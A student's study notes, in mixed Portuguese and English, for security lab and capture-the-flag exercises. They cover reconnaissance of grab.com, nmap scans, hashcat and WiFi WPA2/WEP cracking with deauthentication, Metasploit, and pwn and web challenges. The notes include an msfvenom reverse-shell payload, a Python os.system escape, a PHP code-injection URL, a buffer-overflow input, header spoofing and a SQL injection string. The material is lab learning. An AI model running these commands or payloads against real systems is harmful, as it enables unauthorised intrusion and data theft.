#1 - LAB
##Reconnaissance
###Target: grab.com
###1)
**email providers:** ```% dig MX grab.com```

**DNS txt records:** ```% dig TXT grab.com```

**is email provider correctly configured:** [https://toolbox.googleapps.com/apps/checkmx/]()

###2)

**passive subdomain enumeration:** 

```
% subfinder -d grab.com > subs.txt
% assetfinder grab.com > subs1.txt
% cat subs.txt subs1.txt | sort -u > unique.txt
```
###3)

**Track the location of all IP addresses on the obtained route:** ```% traceroute admiral.grab.com```

**location de cada ip dado no traceroute**: https://www.ip-tracker.org

###4)
**Find active http and https services:** ```% cat unique.txt | httprobe > urls.txt```

###5)
```
% nuclei -u https://aries.grab.com > scanningaries.txt
% nuclei -list urls.txt > scanning.txt
```

##Network scanning
###Asset: receipt.grab.com
###1)Banner grabbing: use nc, telnet, curl -v (for HTTP/HTTPS)
```% curl -v receipt.grab.com```
###2)Ping scan do endereço 192.168.196.50:
```% nmap -sn 192.168.196.50```

**Scanning agressivo:** ```% nmap -A 192.168.196.50 > ex2.2.txt```

**Scanning entre as 1 a 1000:** ```% nmap -T4 -p 1-1000 192.168.196.50```

**List scan:** ```% nmap -sL 192.168.196.50```

###3) wireshark para capturar network packets usar: 
```ip.addr == X.X.X.X``` para filtrar

###4) secret service
```% nmap -T4 -p 5000-7000 192.168.196.50```

##Password cracking and exploitation
###1) Hashcat 
```% hashcat -a 3 -m 1711  {SSHA512}FhFw5Pfw6kQEiSP4+tSkew5kdRzCdtqGaybFFRsPH1OA1oUYqkLdDSg6WzfRCoL3FN1pXyGq9OlE+1iYCUI0uFsG9FNFwls3  -1 "?l?d"  "?1?1?1?1?1?1"```
```
% hashcat -a 3 -m 1711 {SSHA512}FhFw5Pfw6kQEiSP4+tSkew5kdRzCdtqGaybFFRsPH1OA1oUYqkLdDSg6WzfRCoL3FN1pXyGq9OlE+1iYCUI0uFsG9FNFwls3 -1 "?l?d" -o cracked.txt  "?1?1?1?1?1?1"
```
###2) Metasploit 
```
% msfconsole
```
```
msf % search ...
msf % use ...
msf % show options ...
msf % set RHOST 192.168.196.50
msf % set RPORT ...
msf % set LHOST 192.168.196.70 (vpn-zt6ov2vlpl)
 
msf % run
cat /flag.txt
```



##WiFi Security

```% ifconfig``` para saber o nome da WiFi interface

descarregar a wordlist para depois testar as passes

###WPA2) 

```%airmon-ng check kill```

Enable monitor mode on your network interface: 
```
% airmon-ng start wlp2s0
```

Retrieve the target BSSID and channel with ```% airodump-ng wlp2s0```

Capture a 4-way handshake with the command (you need to change BSSID and CHANNEL): ```% airodump-ng -c 1 --bssid xx:xx:xx:xx:xx:xx -w captureName.cap wlp2s0```

While we wait for a handshake, we can use aireplay to force clients to reconnect to the AP (deauth) with: ```% aireplay-ng --deauth 5 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlp2s0```. 

Convert to hashcat format: ```% cap2hccapx captureName.cap captureName.hccapx```

Run hashcat: ```% hashcat -m 2500 captureName.hccapx wordlist.txt```

ou ```aircrack-ng -w wordlist.txt captureName.cap```

###WEP)

```%airmon-ng check kill```

Enable monitor mode on your network interface: ```% airmon-ng start wlp2s0 ```

Run airodump-ng or Wireshark to capture packets:
Retrieve the target BSSID and channel with ```% airodump-ng wlp2s0```

Capture a 4-way handshake with the command (you need to change BSSID and CHANNEL): ```% airodump-ng -c 1 --bssid xx:xx:xx:xx:xx:xx -w captureName.cap wlp2s0```

Use aircrack-ng to crack the key ```% aircrack-ng -1 -a 1 -b xx:xx:xx:xx:xx:xx captureName.cap``` after retrieving enough IVs

---

#2 - MALWARE
ver com `file ...` se estas non stripped se estiver ver com o detect it easy como é que está comprimido

descomprimir com upx -d , depois fazer reverse

---

#3 - REVERSE
Experimentar 

```
python3 -m venv angr
source angr/bin/activate
pip3 install angr
```

1. get win fun addr
2. get base addr 

script no help.py do system em reverse

Fazer funções em python para descobrirem por mim...

---

#4 - PWN -ver ltrace ou strace
fazer `chmod +x filename`

fazer `file ...`

e `checksec --file ...`

no caso da injection deu:

```
arch: i386-32-little 
relro: partial relro 
stack: canary found 
nx: nx enabled 
pie: no pie (0x400000)
```
No caso do ret2win

```
arch: i386-32-little 
relro: partial relro 
stack: no canary found 
nx: nx enabled 
pie: no pie (0x8048000)
```

##MOO - Python
ver que a consola responde a mensagens diferentes de numeros para letras.
dá erro que name 'a' is not defined 

```
% nc 192.168.196.50 5005
% print(__import__('os').system('cat flag.txt'))
```


##Injection
meter a pass que se vê no ghidra depois fazer overflow do buffer que era de 16 bytes e meter o codigo de shell que se quer fazer, neste caso:
`12345678AAAAAAAAcat flag.txt`

##Secure yara runner
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.196.<nr> LPORT=9001 -f elf > shell-x86.elf
nc -lvnp 9001
base64 -w 0 shell-x86.elf > b64_binary.txt
cat <(cat b64_binary.txt) - | nc 192.168.196.50 5002

##Ret2win
correr aquele example.py

para saber qual o address da função win, correr:

`dbg-pwndbg`->
`file ret2win`->`info functions` 
ver o address do win

para saber o numero de A's precisos para fazer o segmentation fault correr:

`dbg-pwndbg`-> `cyclic 200` -> `run`-> dar a string que me deu no cyclic 200 -> acontece segmentation fault -> fazer `cyclic -l daab` sendo daab a parte que deu origem ao invalid address -> o numero de A's é o numero que me deu.



##Easy canary

##Ghost In The Shell

---

#5 - WEB
##Bug Bounty
```dirsearch -u 192.168.196.50:6001``` 

##The Client Side
cat o documento e ver o código html

##IP Service
Usar dirsearch para descobrir que diretórios existem -> `/backups`
voltar a fazer esta pesquisa mas agr com o path .../backups/
Fizer download do backup.zip e o index.php mudar com o --hearder o ip proxy? que estamos a usar
 `curl --header 'X-Forwarded-For: 137.137.137.137' http://192.168.196.50:6004/`

###Fazer com o burp
Usar dirsearch para ver o php...
Abrir o que quero com o firefox
No proxy, fazer interception on e refresh da página do firefox 
depois ir a repeater e adicionar `X-Forwarded-For: 137.137.137.137`,
meter send e ver em baixo




slides do prof:

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```


##Hello - php
Valor não ascii no final para crashar a função: 
`192.168.196.50:6003/?name=<?php system('cat /flag.txt');?>%8A`
##The Speech

##NDA Service



`xxd secret.txt | head`
para ver os primeiros bytes do ficheiro e percebr qual é a signature do sistema

sql injection
'OR 1=1 --